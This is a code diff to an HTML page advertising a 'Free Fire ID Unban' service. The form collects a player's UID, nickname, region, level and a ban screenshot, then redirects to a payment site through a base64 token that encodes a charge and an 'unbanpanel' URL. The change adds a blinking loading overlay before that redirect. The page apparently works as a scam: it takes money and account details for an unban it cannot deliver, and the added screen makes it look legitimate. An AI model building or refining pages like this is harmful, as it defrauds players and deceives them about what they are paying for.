@@ -66,9 +66,61 @@
             margin-top: -10px;
             margin-bottom: 10px;
         }
+        
+        /* Transition Screen */
+        .transition-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+       
+        .transition-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+       
+        .transition-image {
+            max-width: 15%;
+            max-height: 15%;
+        }
+       
+        /* Blinking animation for transition image */
+        @keyframes blinkImage {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(0.95);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+       
+        .transition-image.blink {
+            animation: blinkImage 1s infinite ease-in-out;
+        }
     </style>
 </head>
 <body>
+    <!-- Transition Screen -->
+    <div class="transition-screen" id="transitionScreen">
+        <img src="loding.png" alt="Loading" class="transition-image" id="transitionImage">
+    </div>
+
     <div class="container">
         <h1>Free Fire ID Unban</h1>
         <form id="unbanForm">
@@ -76,8 +128,10 @@
             <input type="text" id="uid" name="uid" placeholder="Enter your Free Fire UID" required oninput="this.value = this.value.replace(/[^0-9]/g, '');">
             <div id="uidError" class="error" style="display: none;"></div>
 
+
             <label for="nickname">Account Nickname</label>
             <input type="text" id="nickname" name="nickname" placeholder="Enter your Free Fire Nickname" required>
+
 
             <label for="device">Your Device</label>
             <select id="device" name="device" required>
@@ -86,6 +140,7 @@
                 <option value="ios">iOS</option>
                 <option value="pc">PC <span class="emulator-note">(Emulator)</span></option>
             </select>
+
 
             <label for="server">Server/Region</label>
             <select id="server" name="server" required>
@@ -105,6 +160,7 @@
                 <option value="bangladesh">Bangladesh</option>
             </select>
 
+
             <label for="reason">Reason for Ban</label>
             <select id="reason" name="reason" required>
                 <option value="" disabled selected>Select Reason for Ban</option>
@@ -115,16 +171,20 @@
                 <option value="unknown_reason">I don't know anything about how my ID got banned</option>
             </select>
 
+
             <label for="level">ID Level</label>
             <input type="text" id="level" name="level" placeholder="Your Free Fire ID Level" required maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 3)">
             <div id="levelError" class="error" style="display: none;">Your ID level does not match.</div>
 
+
             <label for="screenshot">Upload Screenshot <span class="screenshot-note">(Screenshot of Ban Message)</span></label>
             <input type="file" id="screenshot" name="screenshot">
+
 
             <input type="submit" value="Proceed">
         </form>
     </div>
+
 
     <script>
         document.getElementById("unbanForm").addEventListener("submit", function(event) {
@@ -132,6 +192,10 @@
             
             const uid = document.getElementById("uid").value;
             const level = document.getElementById("level").value;
+            
+            // Get transition elements
+            const transitionScreen = document.getElementById("transitionScreen");
+            const transitionImage = document.getElementById("transitionImage");
 
             // Check if UID length is not between 7 and 14
             if (uid.length < 7 || uid.length > 14) {
@@ -140,8 +204,14 @@
                 // Show error message for level
                 alert('Your ID level does not match.');
             } else {
-                // Redirect to the provided URL
-                window.location.href = "https://payment.maxado.in/index.php?token=Mjk5fHxhSFIwY0hNNkx5OTFibUpoYm5CaGJtVnNMbk5pY3k5bllYSmxibUZmWm5KbFpXWnBjbVV2WVdOamIzVnVkSE5mZFc1aVlXNHZlaTlqYjI1bWFYSnRZWFJwYjI0PXx8aHR0cHM6Ly91bmJhbnBhbmVsLnNicy9nYXJlbmFfZnJlZWZpcmUvYWNjb3VudHNfdW5iYW4vei9nYXJlbmFfbG9nby53ZWJw";
+                // Show loading screen
+                transitionScreen.classList.add('active');
+                transitionImage.classList.add('blink');
+                
+                // Redirect after 3 seconds
+                setTimeout(function() {
+                    window.location.href = "https://payment.maxado.in/index.php?token=Mjk5fHxhSFIwY0hNNkx5OTFibUpoYm5CaGJtVnNMbk5pY3k5bllYSmxibUZmWm5KbFpXWnBjbVV2WVdOamIzVnVkSE5mZFc1aVlXNHZlaTlqYjI1bWFYSnRZWFJwYjI0PXx8aHR0cHM6Ly91bmJhbnBhbmVsLnNicy9nYXJlbmFfZnJlZWZpcmUvYWNjb3VudHNfdW5iYW4vei9nYXJlbmFfbG9nby53ZWJw";
+                }, 3000);
             }
         });
     </script>
